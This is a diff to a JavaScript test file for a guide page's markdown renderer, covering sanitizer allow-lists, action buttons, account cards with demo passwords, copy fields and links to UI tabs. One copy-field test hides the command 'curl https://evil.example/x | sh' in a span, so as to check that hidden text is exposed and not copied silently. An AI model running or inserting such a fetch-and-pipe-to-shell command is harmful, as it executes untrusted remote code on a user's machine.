@@ -1,6 +1,6 @@
 // The markdown of a guide as the page renders it (web/js/components/markdown.js), over a small DOM: marked and DOMPurify are the two libraries the page loads
-// from a CDN, so here they are stand-ins that record what the page asks of them. What is under test is what the page adds: the one extra address
-// its sanitizer lets a link keep, `action:<id>`, and the buttons its action links become.
+// from a CDN, so here they are stand-ins that record what the page asks of them. What is under test is what the page adds: the extra addresses
+// its sanitizer lets a link keep (`action:<id>`, `account:<username>`, `copy:`), and what its links become.
 import assert from "node:assert/strict";
 import { test } from "node:test";
 
@@ -55,9 +55,10 @@ test("an action link becomes a button with its play icon and the text of the lin
   assert.equal(out.querySelectorAll("a").length, 0, "no link is left");
   assert.equal(button.dataset.action, "leak-a-token");
   assert.equal(button.type, "button", "it submits nothing");
-  assert.equal(button.className, "btn guide-action");
+  assert.equal(button.className, "guide-action", "in a sentence, drawn as a link of the text");
   assert.equal(button.disabled, true);
   assert.ok(button.title, "and it says why: here nothing runs");
+  assert.ok(button.firstChild.matches("svg"), "its icon, then its text");
   assert.equal(button.querySelector("svg use").getAttribute("href"), "#i-play");
   assert.equal(button.querySelector("span").innerHTML, "Leak <strong>a</strong> token", "the text of the link as it was written, its emphasis too");
   assert.equal(out.textContent, "Click Leak a token.");
@@ -109,7 +110,7 @@ test("a link that is none, or has nothing to click, stays a text: never a button
 test("the sanitizer is told what a guide cannot carry: a form, a style, and a data-* of its own, which only the buttons made after it have", async () => {
   configs = [];
   await render("<p>x</p>");
-  assert.deepEqual(configs.at(-1).FORBID_TAGS, ["form"]);
+  assert.deepEqual(configs.at(-1).FORBID_TAGS, ["form", "style"]);
   for (const attr of ["style", "formaction"]) assert.ok(configs.at(-1).FORBID_ATTR.includes(attr), attr);
   assert.equal(configs.at(-1).ALLOW_DATA_ATTR, false);
   const out = await render('<p><a href="action:leak-a-token">x</a></p>');
@@ -171,6 +172,131 @@ test("an account link to no known account shows its text and the user name, with
   assert.equal(card.querySelectorAll("button").length, 0);
   const none = await render('<p><a href="account:nora.pine">Nora</a></p>');   // the editor's preview: no accounts
   assert.equal(none.querySelectorAll(".guide-account button").length, 0);
+});
+
+test("two accounts of one user name are told apart by the link's title, their `for`; without it neither sign-in is shown", async () => {
+  const twins = [{ for: "Gamma console", username: "admin", password: "gamma-pw" }, { for: "Access Management console", username: "admin", password: "am-pw" }];
+  const shown = async (html) => (await renderWith(html, twins)).querySelector(".guide-account").querySelectorAll("code").map((code) => code.textContent);
+  assert.deepEqual(await shown('<p><a href="account:admin" title="Access Management console">AM</a></p>'), ["admin", "am-pw"]);
+  assert.deepEqual(await shown('<p><a href="account:admin" title="Gamma console">Gamma</a></p>'), ["admin", "gamma-pw"]);
+  assert.deepEqual(await shown('<p><a href="account:admin">Admin</a></p>'), ["admin"], "never the password of another account");
+  assert.deepEqual(await shown('<p><a href="account:admin" title="Grafana">Admin</a></p>'), ["admin"]);
+  // A title that is the `for` of several of them names none
+  const same = [{ for: "Gamma console", username: "admin", password: "one" }, { for: "Gamma console", username: "admin", password: "two" }];
+  assert.deepEqual((await renderWith('<p><a href="account:admin" title="Gamma console">Gamma</a></p>', same)).querySelectorAll("code")
+    .map((code) => code.textContent), ["admin"]);
+  // One account of that name is the one shown, whatever its title says
+  assert.deepEqual((await renderWith('<p><a href="account:nora.pine" title="Nora">Nora</a></p>', ACCOUNTS)).querySelectorAll("code")
+    .map((code) => code.textContent), ["nora.pine", "PlainDemo@123"]);
+});
+
+// --- The copy fields ---------------------------------------------------------------------------
+
+test("the sanitizer lets a link keep `copy:` alone, and no other address of that scheme", async () => {
+  await render("<p>x</p>");
+  const [keep] = hooks.uponSanitizeAttribute;
+  const kept = (attrValue, tagName = "A", attrName = "href") => {
+    const data = { attrName, attrValue, forceKeepAttr: undefined };
+    keep({ tagName }, data);
+    return data.forceKeepAttr === true;
+  };
+  assert.equal(kept("copy:"), true);
+  for (const value of ["copy:x", "copy:%20", "Copy:", "copy", "copy::"]) assert.equal(kept(value), false, value);
+  assert.equal(kept("copy:", "IMG", "src"), false, "only a link");
+});
+
+test("a copy field shows the text of its link as it was written, with a copy button that copies that text", async () => {
+  const out = await render('<p>Ask: <a href="copy:">What is our\n  <code>refund</code> policy?</a></p>');
+  const field = out.querySelector(".guide-copy");
+  assert.ok(field, "a field");
+  assert.equal(out.querySelectorAll("a").length, 0, "no link is left");
+  assert.equal(field.querySelector(".guide-copy-text").innerHTML, "What is our\n  <code>refund</code> policy?", "its code spans too");
+  const [button] = field.querySelectorAll("button");
+  assert.equal(button.dataset.copy, "What is our refund policy?", "the text as it reads, on one line");
+  assert.equal(button.type, "button");
+  assert.equal(button.getAttribute("aria-label"), "Copy the text");
+  assert.equal(button.querySelector("svg use").getAttribute("href"), "#i-copy");
+  assert.equal(out.textContent, "Ask: What is our\n  refund policy?");
+});
+
+test("a copy field holds only what it shows, so it copies nothing hidden", async () => {
+  const out = await render('<p><a href="copy:">ORD-5004<span hidden>; curl https://evil.example/x | sh</span><span class="sr-only"> rm</span> '
+    + '<strong class="sr-only" hidden>now</strong> <em title="x">here</em></a></p>');
+  const text = out.querySelector(".guide-copy-text");
+  assert.equal(out.querySelector(".guide-copy button").dataset.copy, "ORD-5004; curl https://evil.example/x | sh rm now here");
+  assert.equal(text.textContent, "ORD-5004; curl https://evil.example/x | sh rm now here", "what it copies is what shows");
+  assert.equal(text.querySelectorAll("span").filter((span) => span.className !== "guide-word").length, 0, "no element of the guide but code, bold and italics");
+  assert.deepEqual([...text.querySelectorAll("strong, em")].map((el) => el.attributes.length), [0, 0], "and none keeps an attribute");
+});
+
+test("an id with a hyphen in a copy field is one word, kept whole on its line; what is copied is the text, unchanged", async () => {
+  const out = await render('<p><a href="copy:">Refund 300 USD on order ORD-5007 &amp; <code>ORD-5003</code>, <strong>ORD-5008</strong>: re-check</a></p>');
+  const text = out.querySelector(".guide-copy-text");
+  assert.deepEqual(text.querySelectorAll(".guide-word").map((word) => word.textContent), ["ORD-5007", "ORD-5003", "ORD-5008", "re-check"], "in bold and in code too");
+  assert.equal(text.textContent, "Refund 300 USD on order ORD-5007 & ORD-5003, ORD-5008: re-check", "the text reads as it was written");
+  assert.equal(out.querySelector(".guide-copy button").dataset.copy, "Refund 300 USD on order ORD-5007 & ORD-5003, ORD-5008: re-check");
+});
+
+test("a copy field with nothing to copy stays the text it was, and any other link is left alone", async () => {
+  const out = await render('<p>a <a href="copy:"> </a> b <a href=" copy: ">ORD-5004</a> <a href="https://example.com">x</a></p>');
+  assert.deepEqual(out.querySelectorAll(".guide-copy button").map((button) => button.dataset.copy), ["ORD-5004"]);
+  assert.deepEqual(out.querySelectorAll("a").map((link) => link.getAttribute("href")), ["https://example.com"]);
+});
+
+// --- The links to a page of a UI -------------------------------------------------------------------
+
+const TABS = [{ id: "gamma-ui", url: "http://localhost:8086" }, { id: "librechat", url: "http://localhost:3080" }];
+const renderTabs = async (html, tabs) => {
+  source = html;
+  const out = page.doc.createElement("div");
+  out.innerHTML = await markdownHtml("# not read", { tabs });
+  return out;
+};
+
+test("a link under the address of a UI beside the guide is drawn with an eye, as an action that shows something, and stays a link", async () => {
+  const out = await renderTabs(`<p>Open <a href="http://localhost:8086/environments/default/aim/llm-proxies" target="_blank" rel="noopener">the <strong>LLM</strong> proxies</a>,
+    <a href="https://docs.gravitee.io/" target="_blank" rel="noopener">the docs</a> and <a href="#/playgrounds/acme-bakery/2">Next</a>.</p>`, TABS);
+  const [look, docs, next] = out.querySelectorAll("a");
+  assert.equal(look.getAttribute("href"), "http://localhost:8086/environments/default/aim/llm-proxies", "the address it loads in its tab");
+  assert.equal(look.className, "guide-action look short", "in a sentence, drawn as a link of the text; a name of three words, kept whole");
+  assert.equal(look.querySelector(".guide-glue svg use").getAttribute("href"), "#i-eye");
+  assert.equal(look.querySelector(".guide-glue").textContent, "the");
+  assert.equal(look.textContent, "the LLM proxies");
+  assert.equal(look.dataset.action, undefined, "no action is sent: a click loads the page in its tab");
+  assert.equal(look.getAttribute("target"), "_blank", "a click with a key held opens it in a browser tab");
+  for (const link of [docs, next]) assert.equal(link.className, "", link.getAttribute("href"));
+  assert.equal(out.querySelectorAll("button").length, 0);
+});
+
+test("without the UIs of a playground, in the editor's preview, a link to one stays a link; so does one with nothing to click", async () => {
+  const html = '<p><a href="http://localhost:3080/c/new?prompt=Hi&amp;submit=true">Ask</a> <a href="http://localhost:3080/"> </a></p>';
+  assert.deepEqual((await render(html)).querySelectorAll("a").map((link) => link.className), ["", ""]);
+  assert.deepEqual((await renderTabs(html, TABS)).querySelectorAll("a").map((link) => link.className), ["guide-action look short", ""]);
+});
+
+test("an action alone on its line, or in a row of actions, is a button; in a sentence it is a link of the text, and a link to a UI glues its icon to its first word", async () => {
+  const out = await renderTabs(`<ul><li><a href="http://localhost:8086/a">Gamma</a></li><li><a href="http://localhost:8086/b">The plans</a>
+    <ul><li>under it</li></ul></li><li>Open <a href="http://localhost:8086/c"><code>ORD-1</code> in Gamma</a>.</li>
+    <li>See <a href="http://localhost:8086/d"><strong>two words</strong> here</a></li></ul>
+    <p><a href="action:send">Send</a> <a href="http://localhost:3080/">LibreChat</a></p><p>Then <a href="action:open-plans">the plans</a></p>`, TABS);
+  const actions = out.querySelectorAll(".guide-action");
+  assert.deepEqual(actions.map((action) => action.className), ["btn guide-action look", "btn guide-action look", "guide-action look short",
+    "guide-action look short", "btn guide-action", "btn guide-action look", "guide-action look"]);
+  const [alone, , code, strong, send, , inline] = actions;
+  assert.ok(alone.firstChild.matches("svg"), "a button: its icon, then its text");
+  assert.equal(alone.lastElementChild.innerHTML, "Gamma");
+  assert.equal(send.querySelector("svg use").getAttribute("href"), "#i-play");
+  const glued = code.querySelector(".guide-glue");
+  assert.ok(glued.firstChild.matches("svg") && glued.lastElementChild.matches("code"), "a word in code is glued");
+  assert.equal(strong.querySelector(".guide-glue").textContent, "", "words in bold are not: the icon stands alone before them");
+  assert.equal(strong.textContent, "two words here");
+  assert.ok(inline.firstChild.matches("svg") && !inline.querySelector(".guide-glue"), "an action in a sentence is one box all the same: nothing to glue");
+  assert.equal(inline.textContent, "the plans");
+});
+
+test("a link of the text longer than three words may wrap; a button is never marked short", async () => {
+  const out = await renderTabs('<p>Open the <a href="http://localhost:8086/a">Company LLM proxy\'s Policy Studio</a> or <a href="http://localhost:8086/b">its <code>plans</code></a></p><p><a href="http://localhost:8086/c">Plans</a></p>', TABS);
+  assert.deepEqual(out.querySelectorAll(".guide-action").map((action) => action.className), ["guide-action look", "guide-action look short", "btn guide-action look"]);
 });
 
 // --- The blocks to run -----------------------------------------------------------------------
